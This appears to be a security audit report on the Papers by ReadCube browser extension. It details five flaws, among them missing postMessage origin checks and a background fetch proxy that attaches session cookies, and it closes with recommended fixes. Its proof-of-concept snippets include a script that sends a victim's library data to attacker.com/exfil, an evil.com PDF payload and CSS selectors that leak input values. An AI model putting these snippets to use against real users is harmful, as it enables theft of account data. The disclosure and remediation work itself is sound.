# Vulnerability Report: Papers by ReadCube (v6.3.4)

**Extension ID:** `mfacblegickmnfpaebakfnlbfhpoegin`
**Manifest Version:** 3
**Permissions:** `tabs`, `storage`, `activeTab`, `cookies`, `scripting`, `webRequest`
**Host Permissions:** `<all_urls>`
**Triage Flags:** V1=4, V2=4 -- csp_unsafe_inline, postmessage_no_origin, dynamic_window_open, webrequest_all_urls
**Analysis Date:** 2026-02-06

---

## VULN-01: postMessage Handler Without Origin Validation (Content Script)

**CVSS 3.1:** 5.4 (Medium)
**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:L`

**File:** `js/inject.bundle.js:2` (char offset ~1010675)

**Description:**
The inject.bundle.js content script registers a `window.addEventListener("message", ...)` handler that processes messages with a `rightfindMessage` property. This handler performs **no origin validation** on the incoming message. Any web page (or iframe embedded in a page where the extension is active) can send a postMessage to this listener.

The handler calls an internal function `he(doi, pdfUrl)` which creates a hidden `<span>` element in the DOM with `id="readcubeInjectedArticleData"` and sets `data-doi` and `data-pdf-url` attributes to the attacker-controlled values:

```javascript
// inject.bundle.js (deobfuscated)
window.addEventListener("message", function(e) {
    e && e.data && e.data.rightfindMessage && (
        console.log("inecting data", e.data.doi, e.data.pdfUrl),
        he(e.data.doi, e.data.pdfUrl)
    )
});

// he() function:
he = function(e, t) {
    if (!document.querySelector("#readcubeInjectedArticleData")) {
        var n = document.createElement("span");
        n.id = "readcubeInjectedArticleData";
        n.setAttribute("type", "hidden");
        n.setAttribute("data-doi", e);       // attacker controlled
        n.setAttribute("data-pdf-url", t);    // attacker controlled
        document.getElementsByTagName("body")[0].appendChild(n);
    }
};
```

**Contrast with the auth handler:** The login/register message handler in the same bundle correctly validates origin against `readcube.com`:

```javascript
handleIframeMessage: function(e) {
    if (!e.origin.match(/^https:\/\/www\.readcube\.com.*$/)) return false;
    // ... proceeds only if origin matches
}
```

**PoC Exploit Scenario:**
1. Victim visits `attacker.com` with the Papers by ReadCube extension installed.
2. The extension injects its content script into the page on tab update.
3. `attacker.com` runs: `window.postMessage({rightfindMessage: true, doi: "10.1234/malicious", pdfUrl: "https://evil.com/phishing.pdf"}, "*")`
4. The extension injects a hidden span element with attacker-controlled DOI and PDF URL into the page DOM.
5. These injected values are subsequently consumed by the extension's article detection pipeline, which may trigger API calls to ReadCube services using the attacker's DOI, or cause the extension to attempt to fetch/process the attacker's PDF URL.

**Impact:**
- DOM pollution with attacker-controlled content in the extension's data flow
- Potential to trigger extension actions (article lookup, PDF download) using attacker-supplied DOI/URL values
- Could be chained with VULN-02 if the extension processes the injected pdfUrl through its API proxy

---

## VULN-02: Content Script to Background SSRF via Unsanitized URL Proxying

**CVSS 3.1:** 7.1 (High)
**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L`

**Files:**
- `js/inject.bundle.js:2` -- content script API wrapper sends `{apiGet: true, url: <user-controlled>}` etc.
- `js/background.bundle.js:11019` -- `apiPost` handler: `l.A.post(t.url, t.data)`
- `js/background.bundle.js:11031` -- `apiPatch` handler: `l.A.patch(t.url, t.data)`
- `js/background.bundle.js:11043` -- `apiPutPdf` handler: `l.A.putPdf(t.url, d)`
- `js/background.bundle.js:11053` -- `apiDelete` handler: `l.A.delete(t.url)`
- `js/background.bundle.js:11065` -- `apiGet` handler: `l.A.get(t.url)`
- `js/background.bundle.js:11077` -- `apiGetText` handler: `l.A.baseGet(t.url)`

**Description:**
The background service worker's `runtime.onMessage` handler implements a broad message-dispatch system. Multiple message types (`apiPost`, `apiGet`, `apiGetText`, `apiPatch`, `apiPutPdf`, `apiDelete`) accept a `url` parameter directly from the message and pass it unvalidated to `fetch()`. The `get`, `post`, `patch`, `delete`, and `putPdf` methods all use `credentials: "include"`, meaning the user's ReadCube session cookies are attached.

The content script (inject.bundle.js) exposes a wrapper API that sends these messages to the background:

```javascript
// Content script wrapper (inject.bundle.js)
post: function(e, t) {
    return new Promise(function(n, o) {
        i().runtime.sendMessage({apiPost: true, url: e, data: t})
            .then(function(e) { n(e) }, function(e) { o(e) })
    })
}
// Similar wrappers for get, patch, delete, getText, putPdf
```

The background handler directly proxies these to fetch:

```javascript
// Background service worker (background.bundle.js:11019)
if (!t.apiPost) { e.next = 24; break }
return e.abrupt("return", l.A.post(t.url, t.data).then(function(e) {
    return e.json()
}).then(function(e) { return e }));

// l.A.post implementation (background.bundle.js:6645):
post: function(e, t) {
    return fetch(e, {           // e = attacker-controlled URL
        method: "POST",
        credentials: "include", // ReadCube cookies attached!
        headers: {
            "Content-Type": "application/json; charset=utf-8",
            "X-Readcube-Client": "browser_extension",
            ...
        },
        body: JSON.stringify(t) // t = attacker-controlled body
    })
}
```

While `runtime.sendMessage` from a content script IS restricted to the extension's own messaging channel (a web page cannot directly call `chrome.runtime.sendMessage` for another extension), the content script IS injected into every navigated page via `tabs.onUpdated`. This means:

1. If a vulnerability exists in the content script's own page-side input handling (e.g., VULN-01's postMessage without origin check, or DOM-based input), an attacker could potentially influence the URLs passed through the API proxy.
2. More critically, the `externally_connectable` manifest entry allows `*://localhost/*` to use `chrome.runtime.sendMessageExternal()` to directly communicate with the background. While no explicit `onMessageExternal` listener is registered, the webextension-polyfill maps both `onMessage` and `onMessageExternal` through the same handler wrapper (`p(m)`), meaning if the polyfill is active, messages from `localhost` may reach the same dispatch handler.

**PoC Exploit Scenario (via localhost):**

1. Attacker gains code execution on localhost (e.g., via a malicious local app, dev tool, or browser redirect to a local server).
2. From a `localhost` page, the attacker calls:
```javascript
chrome.runtime.sendMessage("mfacblegickmnfpaebakfnlbfhpoegin", {
    apiGet: true,
    url: "https://sync.readcube.com/collections"
}, function(response) {
    // Receives the victim's full library data with session cookies
    fetch("https://attacker.com/exfil", {method: "POST", body: JSON.stringify(response)});
});
```
3. The background service worker fetches the URL with `credentials: "include"`, attaching the victim's ReadCube session cookies.
4. Response data (the victim's library contents) is returned to the attacker.

**PoC Exploit Scenario (via content script chain with VULN-01):**

Note: While `chrome.runtime.sendMessage` cannot be called directly from page JS, the content script processes page-originated postMessages (VULN-01) and processes DOM state that could influence subsequent API calls through the extension's article detection logic.

**Impact:**
- **SSRF:** The background can be directed to fetch arbitrary URLs with the victim's ReadCube credentials
- **Data exfiltration:** An attacker can read responses from ReadCube API endpoints, exfiltrating the user's library, collections, articles, and account details
- **Account actions:** Using `apiPost`/`apiPatch`/`apiDelete`, an attacker could modify or delete the victim's ReadCube library data
- **Cookie theft (indirect):** Requests to attacker-controlled servers will include `X-Readcube-Client` headers, confirming the victim uses the extension
- **Cross-origin data leakage:** The background's `baseGet` function (`fetch(e)` with no restrictions) can fetch and return content from any URL, bypassing same-origin policy

---

## VULN-03: Content Script Sends postMessage to Parent Without Restricted Target Origin

**CVSS 3.1:** 4.3 (Medium)
**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N`

**File:** `iframeRightfind.js:18`

**Description:**
The `iframeRightfind.js` content script, which runs in all frames on `https://www.rightfind.com/*`, extracts a DOI and PDF URL from the page DOM and sends them to the parent frame using `postMessage` with a wildcard (`"*"`) target origin:

```javascript
// iframeRightfind.js:18
window.parent.postMessage({ rightfindMessage: true, doi, pdfUrl }, "*");
```

Using `"*"` as the target origin means the message is delivered to the parent frame regardless of its origin. If the rightfind.com page is embedded in an iframe on an attacker-controlled page, the attacker's page receives the DOI and PDF URL.

**PoC Exploit Scenario:**
1. Attacker creates a page that embeds `https://www.rightfind.com/some-article-page` in an iframe.
2. The `iframeRightfind.js` content script runs inside the iframe (it matches `all_frames: true, match_about_blank: true`).
3. The content script extracts the DOI and PDF URL from the rightfind.com page and sends them via `postMessage("*")` to the attacker's parent frame.
4. The attacker's page listens for messages and captures the research article metadata:
```javascript
window.addEventListener("message", function(e) {
    if (e.data && e.data.rightfindMessage) {
        console.log("Stolen DOI:", e.data.doi);
        console.log("Stolen PDF URL:", e.data.pdfUrl);
    }
});
```

**Impact:**
- Information disclosure of article DOIs and PDF URLs from rightfind.com
- Limited severity as the data leaked is research article metadata (not user credentials), and requires specific framing conditions on rightfind.com

---

## VULN-04: CSP `style-src 'unsafe-inline'` on Extension Pages

**CVSS 3.1:** 3.1 (Low)
**Vector:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N`

**File:** `manifest.json:72`

**Description:**
The extension's Content Security Policy for extension pages includes `style-src * 'unsafe-inline'`:

```json
"content_security_policy": {
    "extension_pages": "... style-src * 'unsafe-inline'; ..."
}
```

This allows inline CSS on extension pages (popup, options, inject.html). While `script-src 'self'` prevents inline JavaScript execution, `unsafe-inline` for styles enables CSS-based data exfiltration attacks if an attacker can inject content into extension pages.

**PoC Exploit Scenario:**
If an attacker can inject HTML content into any extension page (e.g., via a reflected value in the UI), they could use CSS attribute selectors to exfiltrate sensitive data character-by-character:

```css
input[value^="a"] { background: url("https://attacker.com/leak?char=a"); }
input[value^="b"] { background: url("https://attacker.com/leak?char=b"); }
```

**Impact:**
- Weakened defense-in-depth against content injection on extension pages
- Potential CSS-based side-channel data exfiltration, but requires a separate injection vector to be exploitable
- Low severity as standalone finding since `script-src 'self'` still prevents script injection

---

## VULN-05: webRequest Listener on All HTTP/HTTPS URLs With responseHeaders Access

**CVSS 3.1:** 3.7 (Low)
**Vector:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N`

**File:** `js/background.bundle.js:8513`

**Description:**
The background service worker registers a `webRequest.onHeadersReceived` listener on ALL HTTP/HTTPS URLs for main_frame and sub_frame types:

```javascript
// background.bundle.js:8451-8514
i().webRequest.onHeadersReceived.addListener(function() {
    // async handler...
    // checks for sciencedirectassets.com PDFs
    // if PDF content-type detected, creates new tabs and removes original
}, {
    urls: ["http://*/*", "https://*/*"],   // ALL URLs
    types: ["main_frame", "sub_frame"]
}, ["responseHeaders"]);
```

While the handler only acts on specific sciencedirectassets.com URLs, the listener fires for EVERY HTTP/HTTPS navigation, giving the extension access to response headers of all page loads. The handler is gated by a storage check (`READCUBE_NEW_TAB_CHECK_IN_PROGRESS`), but the broad URL filter is an unnecessary over-permission.

The handler also performs tab manipulation (creating new tabs, removing existing tabs) when it detects PDF responses from sciencedirectassets.com, which could potentially be triggered by navigating the user to a crafted URL.

**PoC Exploit Scenario:**
1. Attacker navigates the user to `https://pdf.sciencedirectassets.com/attacker-controlled-path.pdf` while `READCUBE_NEW_TAB_CHECK_IN_PROGRESS` is set.
2. The handler detects the PDF content-type header, creates a new tab to `https://www.sciencedirect.com/?downloadlink=<attacker-url>`, and removes the original tab.
3. This enables a tab-hijacking scenario where the user's current tab is replaced with attacker-influenced content on sciencedirect.com.

**Impact:**
- Response header visibility on all navigations (privacy concern)
- Potential tab manipulation when PDF responses are detected from sciencedirectassets domains
- Limited practical exploitability due to the storage gate condition

---

## Summary

| ID | Title | CVSS | Severity |
|----|-------|------|----------|
| VULN-01 | postMessage Without Origin Validation | 5.4 | Medium |
| VULN-02 | Content Script to Background SSRF via URL Proxying | 7.1 | High |
| VULN-03 | postMessage to Parent With Wildcard Origin | 4.3 | Medium |
| VULN-04 | CSP style-src unsafe-inline on Extension Pages | 3.1 | Low |
| VULN-05 | webRequest on All URLs With responseHeaders | 3.7 | Low |

**Overall Risk Assessment:** The most significant vulnerability is VULN-02, where the background service worker acts as an unrestricted fetch proxy that attaches ReadCube session cookies to arbitrary URLs. Combined with the `externally_connectable` entry allowing `localhost` to communicate with the extension, this creates a realistic attack path for SSRF and data exfiltration of the user's ReadCube library. VULN-01 (missing origin check on postMessage) provides an additional attack surface that could feed attacker-controlled data into the extension's article processing pipeline.

**Recommendations:**
1. Add origin validation to the rightfind postMessage handler in inject.bundle.js
2. Restrict the target origin in iframeRightfind.js from `"*"` to the expected parent origin
3. Validate/allowlist URLs in the background message handler before proxying fetch requests
4. Narrow the webRequest listener URL filter to only the sciencedirectassets.com domains that are actually checked
5. Remove `'unsafe-inline'` from `style-src` and use nonces or hashes instead
6. Consider removing `*://localhost/*` from `externally_connectable` if not needed for development
